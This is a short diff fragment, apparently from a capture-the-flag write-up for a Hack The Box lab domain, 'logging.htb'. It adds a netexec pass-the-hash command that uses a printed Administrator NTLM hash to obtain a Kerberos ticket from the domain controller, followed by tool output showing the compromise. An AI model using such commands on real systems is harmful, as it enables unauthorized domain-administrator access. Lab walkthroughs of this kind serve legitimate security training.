@@ -917,5 +917,11 @@ Then i can dump the NTDS
 However the administrator is in protected users so ill auth with kerberos and get a TGT then get remote access that way
 
 ```python
+❯❯❯ faketime -f +7h nxc smb dc01.logging.htb -u 'Administrator' -H 'a0c1d1bed9126632f5f1f2b3f790bdb5' -k --generate-tgt DA
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [+] logging.htb\Administrator:a0c1d1bed9126632f5f1f2b3f790bdb5 (Pwn3d!)
+SMB         dc01.logging.htb 445    DC01             [+] TGT saved to: DA.ccache
+SMB         dc01.logging.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=DA.ccache
+
 
 ```
